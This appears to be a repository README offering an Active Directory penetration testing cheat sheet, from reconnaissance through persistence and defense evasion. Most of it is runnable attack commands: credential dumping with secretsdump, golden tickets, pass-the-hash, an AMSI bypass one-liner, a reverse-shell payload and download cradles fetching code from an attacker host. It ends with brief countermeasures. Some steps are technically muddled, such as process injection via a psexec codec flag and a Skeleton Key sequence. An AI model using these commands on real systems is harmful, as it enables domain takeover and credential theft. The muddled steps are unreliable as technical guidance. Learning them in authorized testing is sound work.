# Active Directory Penetration Testing Guide

<div align="center">
  <img src="https://img.shields.io/badge/Active%20Directory-Pentest%20Guide-red?style=for-the-badge&logo=microsoft&logoColor=white" alt="AD Pentest Guide">
  <img src="https://img.shields.io/badge/Security-Research-blue?style=for-the-badge&logo=security&logoColor=white" alt="Security Research">
  <img src="https://img.shields.io/badge/Penetration-Testing-green?style=for-the-badge&logo=kali-linux&logoColor=white" alt="Penetration Testing">
</div>

## 📋 Table of Contents

- [Overview](#overview)
- [AD Fundamentals](#ad-fundamentals)
- [Reconnaissance](#reconnaissance)
- [Initial Enumeration](#initial-enumeration)
- [Authentication Attacks](#authentication-attacks)
- [Privilege Escalation](#privilege-escalation)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)
- [Defense Evasion](#defense-evasion)
- [Tools Arsenal](#tools-arsenal)
- [Countermeasures](#countermeasures)
- [References](#references)

---

## 🎯 Overview

This guide provides comprehensive techniques for penetration testing Active Directory environments. It covers everything from initial reconnaissance to advanced persistence techniques.

**⚠️ Legal Disclaimer**: This guide is for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal.

---

## 🏗️ AD Fundamentals

### Core Components

- **Domain Controller (DC)**: Central authority managing authentication and authorization
- **Active Directory Database**: Contains all objects (users, computers, groups)
- **LDAP**: Lightweight Directory Access Protocol for directory queries
- **Kerberos**: Authentication protocol used by AD
- **DNS**: Critical for AD functionality and client communication

### Key Concepts

- **Forest**: Collection of domains sharing common schema
- **Domain Trust**: Relationships between domains
- **Organizational Units (OUs)**: Containers for organizing objects
- **Group Policy Objects (GPOs)**: Centralized configuration management
- **Security Principals**: Users, groups, and computers with SIDs

---

## 🔍 Reconnaissance

### External Reconnaissance

```bash
# DNS Enumeration
nslookup -type=srv _ldap._tcp.domain.com
dig srv _ldap._tcp.domain.com

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.domain.com&output=json" | jq -r '.[].name_value' | sort -u

# OSINT Collection
theHarvester -d domain.com -l 500 -b google,bing,linkedin
```

### Network Discovery

```bash
# Nmap Domain Discovery
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 target-range

# SMB Enumeration
smbclient -L //target-ip -N
enum4linux -a target-ip
```

---

## 🔬 Initial Enumeration

### Anonymous/Guest Access

```bash
# SMB Null Session
smbclient -L //target-ip -N
rpcclient -U "" -N target-ip

# LDAP Anonymous Bind
ldapsearch -x -h target-ip -b "DC=domain,DC=com"
```

### Authenticated Enumeration

```bash
# BloodHound Data Collection
bloodhound-python -u username -p password -d domain.com -dc dc.domain.com -c all

# PowerView Enumeration
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser
Get-NetGroup
Get-NetComputer
```

### LDAP Enumeration

```bash
# User Enumeration
ldapsearch -x -h target-ip -b "DC=domain,DC=com" "(objectClass=user)" | grep sAMAccountName

# Group Enumeration
ldapsearch -x -h target-ip -b "DC=domain,DC=com" "(objectClass=group)" | grep cn:

# Computer Enumeration
ldapsearch -x -h target-ip -b "DC=domain,DC=com" "(objectClass=computer)" | grep dNSHostName
```

---

## 🔓 Authentication Attacks

### Password Spraying

```bash
# Spray Attack
crackmapexec smb targets.txt -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute Password Spray
kerbrute passwordspray -d domain.com users.txt 'Password123!'
```

### Kerberoasting

```bash
# Request Service Tickets
python3 GetUserSPNs.py -request -dc-ip dc-ip domain.com/username:password

# Crack with Hashcat
hashcat -m 13100 kerberoast.hash rockyou.txt
```

### ASREPRoasting

```bash
# Find Users with Pre-auth Disabled
python3 GetNPUsers.py -dc-ip dc-ip -request domain.com/

# Crack ASREPRoast Hashes
hashcat -m 18200 asreproast.hash rockyou.txt
```

### DCSync Attack

```bash
# Dump Domain Hashes
python3 secretsdump.py -just-dc domain.com/username:password@dc-ip

# Specific User Hash
python3 secretsdump.py -just-dc-user Administrator domain.com/username:password@dc-ip
```

---

## ⬆️ Privilege Escalation

### Local Privilege Escalation

```powershell
# PowerUp Enumeration
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Always Install Elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Domain Privilege Escalation

```bash
# Golden Ticket Attack
python3 ticketer.py -nthash krbtgt-hash -domain-sid domain-sid -domain domain.com administrator

# Silver Ticket Attack
python3 ticketer.py -nthash service-hash -domain-sid domain-sid -domain domain.com -spn service/hostname administrator
```

### Delegation Attacks

```bash
# Unconstrained Delegation
python3 findDelegation.py domain.com/username:password

# Constrained Delegation
python3 getST.py -spn target-spn -impersonate administrator domain.com/service-account:password
```

---

## 🚀 Lateral Movement

### Pass-the-Hash

```bash
# SMB Login with Hash
crackmapexec smb target-ip -u username -H ntlm-hash

# WMI Execution
python3 wmiexec.py -hashes :ntlm-hash domain.com/username@target-ip
```

### Pass-the-Ticket

```bash
# Export Tickets
python3 getTGT.py -hashes :ntlm-hash domain.com/username

# Use Ticket
export KRB5CCNAME=username.ccache
python3 psexec.py -k -no-pass domain.com/username@target-hostname
```

### WMI/DCOM

```bash
# WMI Execution
python3 wmiexec.py domain.com/username:password@target-ip

# DCOM Execution
python3 dcomexec.py domain.com/username:password@target-ip
```

---

## 🔒 Persistence

### Golden Ticket

```bash
# Create Golden Ticket
python3 ticketer.py -nthash krbtgt-hash -domain-sid domain-sid -domain domain.com -extra-sid enterprise-admin-sid administrator

# Use Golden Ticket
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.com/administrator@dc-hostname
```

### Skeleton Key

```bash
# Install Skeleton Key
python3 smbexec.py domain.com/username:password@dc-ip
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

### DCShadow

```bash
# DCShadow Attack
python3 dcshadow.py domain.com/username:password@dc-ip -object-dn "CN=target,CN=Users,DC=domain,DC=com"
```

### AdminSDHolder

```bash
# Modify AdminSDHolder
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' domain.com/username:password
```

---

## 🥷 Defense Evasion

### AMSI Bypass

```powershell
# AMSI Bypass
$a = [Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Process Injection

```bash
# Reflective DLL Injection
python3 psexec.py -k -no-pass domain.com/username@target-hostname -codec 'windows-1252'

# Process Hollowing
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o payload.exe
```

### Living Off The Land

```bash
# PowerShell Download Cradle
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker-ip/script.ps1')"

# Certutil Download
certutil -urlcache -split -f http://attacker-ip/file.exe file.exe
```

---

## 🛠️ Tools Arsenal

### Enumeration Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **BloodHound** | AD Relationship Mapping | `bloodhound-python -u user -p pass -d domain.com -dc dc.domain.com -c all` |
| **PowerView** | PowerShell AD Enumeration | `Get-NetDomain`, `Get-NetUser`, `Get-NetGroup` |
| **ldapdomaindump** | LDAP Information Dumping | `ldapdomaindump -u domain\\user -p pass dc-ip` |
| **enum4linux** | SMB/LDAP Enumeration | `enum4linux -a target-ip` |

### Attack Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| **Impacket** | Python AD Attack Suite | `secretsdump.py`, `GetUserSPNs.py`, `psexec.py` |
| **Rubeus** | .NET Kerberos Abuse | `Rubeus.exe kerberoast`, `Rubeus.exe asreproast` |
| **Mimikatz** | Credential Extraction | `sekurlsa::logonpasswords`, `lsadump::dcsync` |
| **CrackMapExec** | Network Enumeration/Attack | `crackmapexec smb targets.txt -u user -p pass` |

### Post-Exploitation

| Tool | Purpose | Usage |
|------|---------|-------|
| **PowerUpSQL** | SQL Server Enumeration | `Get-SQLInstanceDomain`, `Invoke-SQLAudit` |
| **Empire** | Post-Exploitation Framework | `agents`, `modules`, `listeners` |
| **Cobalt Strike** | Advanced Threat Emulation | `beacon`, `malleable-c2` |

---

## 🛡️ Countermeasures

### Detection

- **Windows Event Logs**: Monitor 4624, 4625, 4768, 4769, 4771
- **PowerShell Logging**: Enable module and script block logging
- **Sysmon**: Advanced process and network monitoring
- **EDR Solutions**: Deploy endpoint detection and response

### Hardening

```bash
# Disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Enable LDAP Signing
Set-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=domain,DC=com" -Replace @{options=1}

# Configure Kerberos Settings
Set-ADObject -Identity "CN=Kerberos,CN=Protocols,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=domain,DC=com" -Replace @{maxTicketAge=10}
```

### Monitoring

```bash
# PowerShell Transcript Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 1

# Command Line Auditing
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
```

---

## 📚 References

### Official Documentation
- [Microsoft Active Directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/)
- [Kerberos Protocol](https://tools.ietf.org/html/rfc4120)
- [LDAP Protocol](https://tools.ietf.org/html/rfc4511)

### Security Research
- [Attack Defense](https://attackdefense.com/)
- [HackTricks AD](https://book.hacktricks.xyz/windows/active-directory-methodology)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Tools & Frameworks
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Rubeus](https://github.com/GhostPack/Rubeus)

---

## 🔗 Additional Resources

### Training Platforms
- **HackTheBox**: AD-focused machines and challenges
- **VulnHub**: Free vulnerable VMs
- **PentesterLab**: Web application and AD exercises
- **Cybrary**: Free cybersecurity courses

### Certifications
- **OSCP**: Offensive Security Certified Professional
- **CRTP**: Certified Red Team Professional
- **CRTE**: Certified Red Team Expert
- **GCIH**: GIAC Certified Incident Handler

---

<div align="center">
  <p><strong>⚠️ Remember: Use these techniques only in authorized environments!</strong></p>
  <p>Happy hacking! 🚀</p>
</div> 
